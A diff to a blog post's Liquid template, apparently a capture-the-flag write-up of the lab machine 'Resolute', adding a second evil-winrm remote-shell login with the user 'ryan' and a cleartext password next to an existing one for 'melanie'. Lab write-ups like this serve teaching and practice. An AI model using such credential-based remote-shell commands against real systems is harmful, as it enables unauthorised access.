@@ -156,4 +156,14 @@ evil-winrm -i 10.10.10.169 -u 'melanie' -p 'Welcome123!'
 {% assign image_files = site.static_files | where: "image", true %}
 {% for myimage in image_files %}
   {{ myimage.resolute_winrm_melanie.jpg }}
+
+
+  ....
+
+
+And now ryan
+  {% highlight shell %}
+evil-winrm -i 10.10.10.169 -u 'ryan' -p 'Serv3r4Admin4cc123!'  
+{% endhighlight %}
+
 {% endfor %}
